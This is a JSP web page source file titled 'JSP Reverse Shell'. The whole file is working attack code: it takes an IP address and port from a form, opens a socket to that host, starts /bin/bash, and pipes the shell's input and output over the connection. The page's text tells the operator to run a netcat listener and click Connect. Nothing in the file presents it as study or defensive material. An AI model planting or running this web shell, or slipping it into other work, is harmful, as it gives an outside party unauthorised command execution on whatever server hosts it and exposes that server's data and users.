<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
class StreamConnector extends Thread {

    InputStream is;
    OutputStream os;

    StreamConnector(InputStream is, OutputStream os) {
        this.is = is;
        this.os = os;
    }

    public void run() {
        BufferedReader isr = null;
        BufferedWriter osw = null;
        try {
            isr = new BufferedReader(new InputStreamReader(is));
            osw = new BufferedWriter(new OutputStreamWriter(os));
            char buffer[] = new char[8192];
            int lenRead;
            while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {
                osw.write(buffer, 0, lenRead);
                osw.flush();
            }
        } catch (Exception e) {
            System.out.println("exception: " + e.getMessage());
        }
        try {
            if (isr != null)
                isr.close();
            if (osw != null)
                osw.close();
        } catch (Exception e) {
            System.out.println("exception: " + e.getMessage());
        }
    }

}
%>

<h1>JSP Reverse Shell</h1>
<p>Run nc -l 1234 on your client (127.0.0.1) and click Connect. This JSP will start a bash shell and connect it to your nc process</p>
<form method="get">
	IP Address<input type="text" name="ipaddress" size=30 value="127.0.0.1"/>
	Port<input type="text" name="port" size=10 value="1234"/>
	<input type="submit" name="Connect" value="Connect"/>
</form>

<%
    String ipAddress = request.getParameter("ipaddress");
    String ipPort = request.getParameter("port");
    Socket sock = null;
    Process proc = null;
    if (ipAddress != null && ipPort != null) {
        try {
            sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
            System.out.println("socket created: " + sock.toString());
            Runtime rt = Runtime.getRuntime();
            proc = rt.exec("/bin/bash");
            System.out.println("process /bin/bash started: " + proc.toString());
            StreamConnector outputConnector = new StreamConnector(proc.getInputStream(), sock.getOutputStream());
            System.out.println("outputConnector created: " + outputConnector.toString());
            StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), proc.getOutputStream());
            System.out.println("inputConnector created: " + inputConnector.toString());
            outputConnector.start();
            inputConnector.start();
        } catch (Exception e) {
            System.out.println("exception: " + e.getMessage());
        }
    }
    if (sock != null && proc != null) {
        out.println("<div class='separator'></div>");
        out.println("<p>Process /bin/bash, running as (" + proc.toString() + ", is connected to socket " + sock.toString() + ".</p>");
    }
%>
